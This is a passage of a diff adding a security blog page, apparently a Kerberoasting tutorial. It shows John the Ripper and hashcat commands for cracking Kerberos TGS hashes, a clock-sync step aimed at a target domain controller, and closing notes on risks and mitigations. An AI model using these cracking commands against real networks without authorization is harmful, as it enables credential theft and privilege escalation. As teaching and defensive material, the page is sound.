+</span></span><span class="line"><span class="cl"><span class="c1"># --wordlist: Specify the path to your wordlist (e.g., rockyou.txt).</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hash.txt: The file containing the TGS hash.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/path/to/wordlist.txt hash.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">######### Using Hashcat #########</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -m 13100: Hash type for Kerberos 5 TGS-REP etype 23 (RC4).</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -a 0: Attack mode (0 for dictionary attack).</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hash.txt: The file containing your Kerberos TGS hash.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># /path/to/wordlist.txt: The path to your wordlist.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> -a <span class="m">0</span> hash.txt /path/to/wordlist.txt
+</span></span></code></pre></div><h2 id="extras--fixing-kerberos-clock-skew-too-great-resolved"><strong>Extras : Fixing Kerberos Clock Skew Too Great Resolved</strong><a hidden class="anchor" aria-hidden="true" href="#extras--fixing-kerberos-clock-skew-too-great-resolved">#</a></h2>
+<p>Ever seen the error “<strong>Kerberos Clock Skew Too Great</strong>” and wondered why your carefully planned attack — or legitimate authentication — isn’t working? This error occurs when there is a significant time difference (typically more than 5 minutes) between the client, server, and the Key Distribution Center (KDC) in a Kerberos environment.</p>
+<p><img alt="Image from: https://miro.medium.com/v2/resize:fit:828/format:webp/1*eRZmVfcphNLT9-5PWA1PBQ.png" loading="lazy" src="https://i.imgur.com/NdOYs9o.png"></p>
+<p><strong>Why Does This Happen?</strong></p>
+<p>Kerberos relies heavily on time synchronization to prevent replay attacks. If the clocks of the devices involved are out of sync beyond the allowed threshold, authentication requests are rejected with this error. This could be fixed with this simple below commands :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">timedatectl set-ntp off
+</span></span><span class="line"><span class="cl">sudo rdate -n <span class="o">[</span>DC-IP of Target<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -n: use SNTP instead of RFC868 time protocol</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">######### Reset back to the default once done #########</span>
+</span></span><span class="line"><span class="cl">timedatectl set-ntp on
+</span></span><span class="line"><span class="cl">timedatectl status
+</span></span></code></pre></div><h2 id="wrapping-up-the-danger-of-kerberoasting"><strong>Wrapping Up: The Danger of Kerberoasting</strong><a hidden class="anchor" aria-hidden="true" href="#wrapping-up-the-danger-of-kerberoasting">#</a></h2>
+<p>Kerberoasting is a potent technique in an attacker’s arsenal. Understanding its risks and maintaining robust security practices are vital to protecting your network and sensitive information.</p>
+<ul>
+<li>
+<p><input checked="" disabled="" type="checkbox"> <strong>Access to High-Value Accounts:</strong> <strong>Kerberoasting</strong> targets service accounts, often with elevated privileges. Cracking these tickets can lead to full administrative access, allowing attackers to pivot through the network and escalate privileges.</p>
+</li>
+<li>
+<p><input checked="" disabled="" type="checkbox"> <strong>Weak Encryption is a Weakness:</strong> Many environments still use outdated encryption types like <strong>RC4 (Type 23)</strong>. These weaker encryption methods are more susceptible to cracking, making them easier targets for attackers with the right tools and techniques.</p>
+</li>
+<li>
+<p><input checked="" disabled="" type="checkbox"> <strong>Minimal Effort, High Reward:</strong> Once attackers have the Kerberos tickets, cracking them can be straightforward with tools like <strong>John the Ripper</strong> and <strong>Hashcat</strong>. This means attackers can potentially gain access without significant effort, exploiting weak spots in the system’s security.</p>
+</li>
+<li>
+<p><input checked="" disabled="" type="checkbox"> <strong>Mitigation Matters:</strong> Regularly updating service account passwords and using strong encryption methods are crucial defenses. Monitoring and auditing Kerberos tickets and leveraging tools to detect unusual activity can also help mitigate the risk.</p>
+</li>
+</ul>
+<h2 id="resources"><strong>Resources</strong><a hidden class="anchor" aria-hidden="true" href="#resources">#</a></h2>
+<ul>
+<li><a href="https://adsecurity.org/?s=kerberoast"><em>Kerberoasting Blogs From <code>Adsecurity.org</code></em></a></li>
+<li><a href="https://onecloudemoji.github.io/labbing/pivoting-and-kerberoast-lab-setup/"><em>Setting Up a Kerberoasting lab by James Hay X <code>Onecloudemoji</code></em></a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
+      <li><a href="http://localhost:1313/tags/active-directory/">Active Directory</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/hacking/api_testing_portswigger/">
+    <span class="title">Next »</span>
+    <br>
+    <span>API Testing || Attacking REST, Swagger APIs {Portswigger}</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
